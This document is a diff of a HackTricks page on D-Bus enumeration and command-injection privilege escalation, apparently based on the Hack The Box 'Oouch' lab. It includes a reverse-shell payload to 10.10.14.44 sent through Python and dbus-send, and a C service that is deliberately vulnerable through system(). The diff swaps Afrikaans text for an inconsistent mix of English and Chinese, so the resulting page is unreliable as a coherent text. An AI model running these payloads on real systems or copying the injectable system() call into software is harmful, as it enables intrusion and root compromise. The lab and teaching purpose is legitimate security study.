@@ -1,27 +1,27 @@
-# D-Bus Enumerasie & Opdraginspuiting Voorregverhoging
+# D-Bus Enumeration & Command Injection Privilege Escalation
 
 {% hint style="success" %}
-Leer & oefen AWS Hack: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## **GUI enumerasie**
+## **GUI enumeration**
 
-D-Bus word gebruik as die interproseskommunikasie (IPC) bemiddelaar in Ubuntu-desktopomgewings. Op Ubuntu word die gelyktydige werking van verskeie boodskapbusse waargeneem: die stelselbus, hoofsaaklik gebruik deur **bevoorregte dienste om dienste bloot te stel wat regoor die stelsel relevant is**, en 'n sessiebus vir elke ingeteken gebruiker, wat slegs dienste blootstel wat net vir daardie spesifieke gebruiker relevant is. Die fokus hier is hoofsaaklik op die stelselbus weens sy assosiasie met dienste wat met hoër voorregte (bv., root) hardloop, aangesien ons doel is om voorregte te verhoog. Daar word opgemerk dat D-Bus se argitektuur 'n 'roeteerder' per sessiebus gebruik, wat verantwoordelik is vir die omleiding van kliëntboodskappe na die toepaslike dienste gebaseer op die adres wat deur die kliënte vir die diens wat hulle wil kommunikeer mee gespesifiseer is.
+D-Bus 被用作 Ubuntu 桌面环境中的进程间通信 (IPC) 中介。在 Ubuntu 中，观察到多个消息总线的并发操作：系统总线，主要由 **特权服务用于暴露与系统相关的服务**，以及每个登录用户的会话总线，仅暴露与该特定用户相关的服务。这里的重点主要是系统总线，因为它与以更高特权（例如，root）运行的服务相关，我们的目标是提升特权。值得注意的是，D-Bus 的架构为每个会话总线采用了一个“路由器”，负责根据客户端为其希望与之通信的服务指定的地址，将客户端消息重定向到适当的服务。
 
-Dienste op D-Bus word gedefinieer deur die **voorwerpe** en **koppelvlakke** wat hulle blootstel. Voorwerpe kan vergelyk word met klasinstansies in standaard OOP-tale, met elke instansie uniek geïdentifiseer deur 'n **voorwerppad**. Hierdie pad, soortgelyk aan 'n lêersisteempad, identifiseer elke voorwerp wat deur die diens blootgestel word uniek. 'n Sleutelkoppelvlak vir navorsingsdoeleindes is die **org.freedesktop.DBus.Introspectable**-koppelvlak, wat 'n enkele metode, Introspect, bevat. Hierdie metode gee 'n XML-voorstelling van die ondersteunde metodes van die voorwerp, seine, en eienskappe, met 'n fokus hier op metodes terwyl eienskappe en seine uitgelaat word.
+D-Bus 上的服务由它们暴露的 **对象** 和 **接口** 定义。对象可以类比于标准 OOP 语言中的类实例，每个实例通过 **对象路径** 唯一标识。该路径类似于文件系统路径，唯一标识服务暴露的每个对象。一个关键的研究接口是 **org.freedesktop.DBus.Introspectable** 接口，具有一个方法 Introspect。该方法返回对象支持的方法、信号和属性的 XML 表示，这里重点关注方法，同时省略属性和信号。
 
-Vir kommunikasie met die D-Bus-koppelvlak is twee gereedskappe gebruik: 'n CLI-gereedskap genaamd **gdbus** vir maklike aanroeping van metodes wat deur D-Bus in skripte blootgestel word, en [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), 'n op Python-gebaseerde GUI-gereedskap wat ontwerp is om die beskikbare dienste op elke bus te enumereer en die voorwerpe wat binne elke diens bevat word, te vertoon.
+为了与 D-Bus 接口进行通信，使用了两个工具：一个名为 **gdbus** 的 CLI 工具，用于在脚本中轻松调用 D-Bus 暴露的方法，以及 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)，这是一个基于 Python 的 GUI 工具，旨在枚举每个总线可用的服务并显示每个服务包含的对象。
 ```bash
 sudo apt-get install d-feet
 ```
@@ -30,21 +30,21 @@ sudo apt-get install d-feet
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
 
-In die eerste afbeelding word dienste geregistreer met die D-Bus stelselbus, met **org.debin.apt** spesifiek uitgelig na die kies van die Stelselbus knoppie. D-Feet ondersoek hierdie diens vir objekte, wat koppelvlakke, metodes, eienskappe, en seine vir gekose objekte vertoon, soos gesien in die tweede afbeelding. Die handtekening van elke metode word ook in detail beskryf.
+在第一张图片中，显示了注册到 D-Bus 系统总线的服务，特别是在选择系统总线按钮后突出显示了 **org.debin.apt**。D-Feet 查询此服务以获取对象，显示所选对象的接口、方法、属性和信号，如第二张图片所示。每个方法的签名也有详细说明。
 
-'n Merkwaardige kenmerk is die vertoning van die diens se **proses-ID (pid)** en **opdraglyn**, nuttig vir die bevestiging of die diens met verhoogde voorregte loop, belangrik vir navorsingsrelevantie.
+一个显著的特点是显示服务的 **进程 ID (pid)** 和 **命令行**，这对于确认服务是否以提升的权限运行非常有用，这对研究的相关性很重要。
 
-**D-Feet laat ook metode-aanroeping toe**: gebruikers kan Python-uitdrukkings as parameters invoer, wat D-Feet na D-Bus-tipes omskakel voordat dit na die diens gestuur word.
+**D-Feet 还允许方法调用**：用户可以输入 Python 表达式作为参数，D-Feet 会将其转换为 D-Bus 类型，然后传递给服务。
 
-Let egter daarop dat **sekere metodes verifikasie vereis** voordat ons hulle kan aanroep. Ons sal hierdie metodes ignoreer, aangesien ons doel is om ons voorregte te verhoog sonder geloofsbriewe in die eerste plek.
+但是，请注意 **某些方法需要身份验证**，才能允许我们调用它们。我们将忽略这些方法，因为我们的目标是首先在没有凭据的情况下提升我们的权限。
 
-Let ook daarop dat sommige van die dienste 'n ander D-Bus-diens ondersoek met die naam org.freedeskto.PolicyKit1 of 'n gebruiker toegelaat moet word om sekere aksies uit te voer of nie.
+还要注意，某些服务会查询另一个名为 org.freedeskto.PolicyKit1 的 D-Bus 服务，以确定用户是否应该被允许执行某些操作。
 
-## **Opdraglyn Opmaking**
+## **命令行枚举**
 
-### Lys Diensobjekte
+### 列出服务对象
 
-Dit is moontlik om geopende D-Bus-koppelvlakke te lys met:
+可以使用以下命令列出打开的 D-Bus 接口：
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -68,13 +68,13 @@ org.freedesktop.PolicyKit1               - -               -                (act
 org.freedesktop.hostname1                - -               -                (activatable) -                         -
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
-#### Verbindings
+#### 连接
 
-[Vanaf Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wanneer 'n proses 'n verbinding met 'n bus opstel, ken die bus aan die verbinding 'n spesiale busnaam toe wat _unieke verbindingsnaam_ genoem word. Busname van hierdie tipe is onveranderlik—dit word gewaarborg dat hulle nie sal verander solank die verbinding bestaan nie—en, nog belangriker, hulle kan nie hergebruik word gedurende die leeftyd van die bus nie. Dit beteken dat geen ander verbinding met daardie bus ooit so 'n unieke verbindingsnaam toegewys sal kry nie, selfs as dieselfde proses die verbinding met die bus afsluit en 'n nuwe een skep. Unieke verbindingsname is maklik herkenbaar omdat hulle begin met die—andersins verbode—kolonkarakter.
+[来自维基百科：](https://en.wikipedia.org/wiki/D-Bus) 当一个进程建立与总线的连接时，总线会为该连接分配一个特殊的总线名称，称为 _唯一连接名称_。这种类型的总线名称是不可变的——只要连接存在，就保证不会改变——更重要的是，它们在总线的生命周期内不能被重用。这意味着，即使同一个进程关闭与总线的连接并创建一个新的连接，也不会有其他连接被分配这样的唯一连接名称。唯一连接名称很容易识别，因为它们以——否则被禁止的——冒号字符开头。
 
-### Diensobjekinligting
+### 服务对象信息
 
-Dan kan jy 'n bietjie inligting oor die koppelvlak verkry met:
+然后，您可以通过以下方式获取有关接口的一些信息：
 ```bash
 busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
 
@@ -134,9 +134,9 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### Lys van Koppelvlakke van 'n Diensvoorwerp
+### 列出服务对象的接口
 
-Jy moet genoeg regte hê.
+您需要拥有足够的权限。
 ```bash
 busctl tree htb.oouch.Block #Get Interfaces of the service object
 
@@ -144,9 +144,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 └─/htb/oouch
 └─/htb/oouch/Block
 ```
-### Inspekteer die Koppelvlak van 'n Diensvoorwerp
+### Introspect Interface of a Service Object
 
-Merk op hoe in hierdie voorbeeld die jongste koppelvlak wat ontdek is, gekies is deur die `tree` parameter te gebruik (_sien vorige afdeling_):
+注意在这个例子中，使用 `tree` 参数选择了最新发现的接口（_见前一节_）：
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -164,25 +164,25 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-Noteer die metode `.Block` van die koppelvlak `htb.oouch.Block` (die een waarin ons belangstel). Die "s" van die ander kolomme mag beteken dat dit 'n string verwag.
+注意接口 `htb.oouch.Block` 的方法 `.Block`（我们感兴趣的那个）。其他列的 "s" 可能意味着它期望一个字符串。
 
-### Monitor/Vaslegging Koppelvlak
+### 监控/捕获接口
 
-Met genoeg voorregte (net `send_destination` en `receive_sender` voorregte is nie genoeg nie) kan jy **'n D-Bus kommunikasie monitor**.
+拥有足够的权限（仅有 `send_destination` 和 `receive_sender` 权限是不够的）你可以 **监控 D-Bus 通信**。
 
-Om 'n **kommunikasie** te **monitor** sal jy as **root** moet wees. As jy nog probleme ondervind om as root te wees, kyk na [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) en [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+为了 **监控** 一次 **通信** 你需要 **root** 权限。如果你在成为 root 时仍然遇到问题，请查看 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 和 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 {% hint style="warning" %}
-As jy weet hoe om 'n D-Bus konfigurasie lêer te konfigureer om **nie-root gebruikers toe te laat om** die kommunikasie te **sniff nie, kontak my asseblief!
+如果你知道如何配置 D-Bus 配置文件以 **允许非 root 用户嗅探** 通信，请 **联系我**！
 {% endhint %}
 
-Verskillende maniere om te monitor:
+监控的不同方法：
 ```bash
 sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-In die volgende voorbeeld word die koppelvlak `htb.oouch.Block` gemonitor en **die boodskap "**_**lalalalal**_**" word deur misverstand gestuur**:
+在以下示例中，接口 `htb.oouch.Block` 被监控，并且 **通过误传发送了消息 "**_**lalalalal**_**"**：
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -201,13 +201,15 @@ MESSAGE "s" {
 STRING "Carried out :D";
 };
 ```
-#### Filtrering van al die geraas <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
+您可以使用 `capture` 代替 `monitor` 将结果保存到 pcap 文件中。
 
-As daar net te veel inligting op die bus is, stuur 'n ooreenstemmingsreël soos volg:
+#### 过滤所有噪音 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
+
+如果总线上的信息太多，可以传递一个匹配规则，如下所示：
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-Verskeie reëls kan gespesifiseer word. As 'n boodskap aan _enige_ van die reëls voldoen, sal die boodskap afgedruk word. Soos dit:
+多个规则可以被指定。如果一条消息匹配_任何_规则，该消息将被打印。像这样：
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -215,15 +217,15 @@ dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```bash
 dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
-Sien die [D-Bus-dokumentasie](http://dbus.freedesktop.org/doc/dbus-specification.html) vir meer inligting oor ooreenstemmingsreël sintaksis.
+查看[D-Bus文档](http://dbus.freedesktop.org/doc/dbus-specification.html)以获取有关匹配规则语法的更多信息。
 
-### Meer
+### 更多
 
-`busctl` het selfs meer opsies, [**vind almal hier**](https://www.freedesktop.org/software/systemd/man/busctl.html).
+`busctl`还有更多选项，[**在这里找到所有选项**](https://www.freedesktop.org/software/systemd/man/busctl.html)。
 
-## **Kwesbare Skenario**
+## **易受攻击的场景**
 
-As gebruiker **qtc binne die gasheer "oouch" van HTB** kan jy 'n **onverwagte D-Bus-konfigurasie lêer** vind wat in _/etc/dbus-1/system.d/htb.oouch.Block.conf_ geleë is:
+作为用户**qtc 在主机 "oouch" 来自 HTB**，您可以找到一个**意外的 D-Bus 配置文件**，位于 _/etc/dbus-1/system.d/htb.oouch.Block.conf_：
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
@@ -244,9 +246,9 @@ As gebruiker **qtc binne die gasheer "oouch" van HTB** kan jy 'n **onverwagte D-
 
 </busconfig>
 ```
-Merk op uit die vorige konfigurasie dat **jy die gebruiker `root` of `www-data` sal moet wees om inligting te stuur en te ontvang** via hierdie D-BUS kommunikasie.
+注意从之前的配置中，**您需要是用户 `root` 或 `www-data` 才能通过此 D-BUS 通信发送和接收信息**。
 
-As gebruiker **qtc** binne die docker houer **aeb4525789d8** kan jy 'n paar dbus-verwante kode vind in die lêer _/code/oouch/routes.py._ Dit is die interessante kode:
+作为用户 **qtc** 在 docker 容器 **aeb4525789d8** 内，您可以在文件 _/code/oouch/routes.py_ 中找到一些与 dbus 相关的代码。这是有趣的代码：
 ```python
 if primitive_xss.search(form.textfield.data):
 bus = dbus.SystemBus()
@@ -258,14 +260,14 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-Soos u kan sien, dit is **verbind met 'n D-Bus-koppelvlak** en stuur na die **"Block" funksie** die "client\_ip".
+如您所见，它正在**连接到 D-Bus 接口**并将“client\_ip”发送到**“Block”函数**。
 
-Aan die ander kant van die D-Bus-koppelvlak is daar 'n C-saamgestelde binêre lopende. Hierdie kode is **luisterend** in die D-Bus-koppelvlak **vir IP-adres en roep iptables aan via die `system`-funksie** om die gegewe IP-adres te blokkeer.\
-**Die oproep na `system` is opsetlik vatbaar vir bevelinspuiting**, so 'n lading soos die volgende sal 'n omgekeerde dop skep: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+在 D-Bus 连接的另一端，有一些 C 编译的二进制文件在运行。此代码正在**监听** D-Bus 连接**以获取 IP 地址，并通过 `system` 函数调用 iptables** 来阻止给定的 IP 地址。\
+**对 `system` 的调用故意存在命令注入漏洞**，因此像以下这样的有效载荷将创建一个反向 shell：`;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-### Exploiteer dit
+### 利用它
 
-Aan die einde van hierdie bladsy kan u die **volledige C-kode van die D-Bus-aansoek** vind. Binne-in kan u tussen die lyne 91-97 vind **hoe die `D-Bus objekpaadjie`** **en `koppelvlaknaam`** is **geregistreer**. Hierdie inligting sal nodig wees om inligting na die D-Bus-koppelvlak te stuur:
+在本页的末尾，您可以找到**D-Bus 应用程序的完整 C 代码**。在其中，您可以在第 91-97 行之间找到**如何注册 `D-Bus 对象路径`** **和 `接口名称`**。此信息将是发送信息到 D-Bus 连接所必需的：
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -275,13 +277,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Ook, in lyn 57 kan jy vind dat **die enigste metode geregistreer** vir hierdie D-Bus kommunikasie genoem word `Block`(_**Dit is waarom in die volgende afdeling die payloads na die diensobjek `htb.oouch.Block`, die koppelvlak `/htb/oouch/Block` en die metode naam `Block` gestuur gaan word**_):
+此外，在第57行中，您可以发现**为此D-Bus通信注册的唯一方法**称为`Block`（_**这就是为什么在接下来的部分中，负载将被发送到服务对象`htb.oouch.Block`，接口`/htb/oouch/Block`和方法名`Block`**_）：
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Die volgende Python-kode sal die lading stuur na die D-Bus verbinding na die `Block` metode via `block_iface.Block(runme)` (_let wel dat dit uit die vorige stuk kode onttrek is_):
+以下Python代码将通过`block_iface.Block(runme)`将有效负载发送到D-Bus连接的`Block`方法（_请注意，它是从前面的代码块中提取的_）：
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -291,20 +293,20 @@ runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
 response = block_iface.Block(runme)
 bus.close()
 ```
-#### busctl en dbus-send
+#### busctl 和 dbus-send
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-* `dbus-send` is 'n gereedskap wat gebruik word om 'n boodskap na die "Boodskapbus" te stuur.
-* Boodskapbus - 'n sagteware wat deur stelsels gebruik word om kommunikasie tussen aansoeke maklik te maak. Dit is verwant aan 'n Boodskapry (boodskappe is in volgorde georden) maar in 'n Boodskapbus word die boodskappe gestuur in 'n intekenmodel en ook baie vinnig.
-* Die "-stelsel" etiket word gebruik om aan te dui dat dit 'n stelselboodskap is, nie 'n sessieboodskap (standaard).
-* Die "--druk-antwoord" etiket word gebruik om ons boodskap toepaslik af te druk en enige antwoorde in 'n mens-leesbare formaat te ontvang.
-* "--dest=Dbus-Interface-Blok" Die adres van die Dbus-inferface.
-* "--string:" - Tipe boodskap wat ons graag na die inferface wil stuur. Daar is verskeie formate om boodskappe te stuur soos dubbel, bytes, booleans, int, objekpad. Uit hiervan is die "objekpad" nuttig wanneer ons 'n pad van 'n lêer na die Dbus-inferface wil stuur. Ons kan in hierdie geval 'n spesiale lêer (FIFO) gebruik om 'n bevel na die inferface te stuur onder die naam van 'n lêer. "string:;" - Dit is om die objekpad weer te roep waar ons die plek van FIFO-omgekeerde doplêer/lêer plaas.
-  
-_Merk op dat in `htb.oouch.Block.Block`, die eerste deel (`htb.oouch.Block`) na die diensobjek verwys en die laaste deel (`.Block`) na die metode naam verwys._
+* `dbus-send` 是一个用于向“消息总线”发送消息的工具
+* 消息总线 – 一种软件，系统通过它使应用程序之间的通信变得简单。它与消息队列相关（消息按顺序排列），但在消息总线中，消息以订阅模型发送，并且速度非常快。
+* “-system” 标签用于指明这是一个系统消息，而不是会话消息（默认情况下）。
+* “–print-reply” 标签用于适当地打印我们的消息，并以人类可读的格式接收任何回复。
+* “–dest=Dbus-Interface-Block” Dbus 接口的地址。
+* “–string:” – 我们希望发送到接口的消息类型。有几种发送消息的格式，如双精度、字节、布尔值、整数、对象路径。在这些中，“对象路径”在我们想要将文件路径发送到 Dbus 接口时非常有用。在这种情况下，我们可以使用一个特殊文件（FIFO）来以文件名的形式将命令传递给接口。“string:;” – 这是为了再次调用对象路径，我们放置 FIFO 反向 shell 文件/命令。
 
-### C-kode
+_注意在 `htb.oouch.Block.Block` 中，第一部分 (`htb.oouch.Block`) 引用服务对象，最后一部分 (`.Block`) 引用方法名称。_
+
+### C 代码
 
 {% code title="d-bus_server.c" %}
 ```c
@@ -449,20 +451,20 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 ```
 {% endcode %}
 
-## Verwysings
+## 参考文献
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
